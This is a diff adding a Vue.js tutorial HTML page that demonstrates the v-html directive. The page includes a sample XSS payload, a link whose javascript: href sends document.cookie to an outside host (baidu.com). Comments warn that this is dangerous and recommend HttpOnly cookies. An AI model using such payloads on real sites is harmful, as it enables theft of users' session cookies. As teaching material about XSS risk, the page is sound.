@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script type="text/javascript" src="../js/vue.js"></script>
+</head>
+<body>
+
+    <!-- 准备好一个容器 {{}}只是一个分隔符设计成这样 里面是js表达式或者代码-->
+    <div id="root">
+        <div v-html="str"></div>
+    </div>
+
+    <script type="text/javascript">
+        Vue.config.productionTip = false
+
+        //创建vue实例 参数是对象
+        //vue实例与容器是一对一的关系
+        const x = new Vue({
+            el:'#root',//element 选择器css 或者使用getelementById
+            data:{
+                name:'Vue',
+                str:'<a href=javascript:location.href="www.baidu.com?"+document.cookie>cookie</a>'
+                    /**
+                     * 这种行为很危险。
+                     * 服务器应该对敏感数据设置http only
+                    */
+            }
+        })
+
+        /**
+         * cookie就类似对象
+         * key value形式
+         * 
+         * 工作流程：
+         * 第一次请求，服务器给cookie
+         * 第二次用cookie请求，服务器鉴别就可以不用登录了
+        */
+
+    </script>
+</body>
+</html>
